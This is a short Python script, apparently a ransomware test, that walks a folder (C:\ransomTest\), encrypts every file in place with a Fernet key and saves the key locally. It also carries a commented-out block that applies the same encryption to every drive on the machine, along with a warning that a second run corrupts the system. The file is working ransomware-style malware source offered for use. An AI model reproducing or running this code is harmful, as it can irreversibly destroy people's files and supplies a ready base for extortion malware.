import os
import win32api
from cryptography.fernet import Fernet
key=Fernet.generate_key()
list_of_files = []
#CAUTION : Uncommmenting Below code snippet will encrypt all the files in your system. However decryption is available,
#But if you run this code twice entire system will be curropted. So use at your own risk
# drives=win32api.GetLogicalDriveStrings()
# drives=drives.split('\000')[:-1]
# for dri in drives:
#     path=dri
#     for root, dirs, files in os.walk(path):
# 	  for file in files:
# 		list_of_files.append(os.path.join(root,file))
#     for file in list_of_files:
#           os.path.isfile(file)
#           if file == 'encrypter.py' or file=='secretkey.key':
#              continue
#           with open("secretkey.key","wb") as akey:
#               akey.write(key)
#           with open(file,"rb") as thefiles:
#              contents=thefiles.read()
#              contents_encry=Fernet(key).encrypt(contents)
#           with open(file,"wb") as thefiles:
#              thefiles.write(contents_encry)
#           print(f"Successfully Encrypter {file}")


path ="C:\\ransomTest\\"
for root, dirs, files in os.walk(path):
	for file in files:
		list_of_files.append(os.path.join(root,file))
for file in list_of_files:
          os.path.isfile(file)
          if file == 'encrypter.py' or file=='secretkey.key':
             continue
          with open("secretkey.key","wb") as akey:
              akey.write(key)
          with open(file,"rb") as thefiles:
             contents=thefiles.read()
             contents_encry=Fernet(key).encrypt(contents)
          with open(file,"wb") as thefiles:
             thefiles.write(contents_encry)
          print(f"Successfully Encrypter {file}")
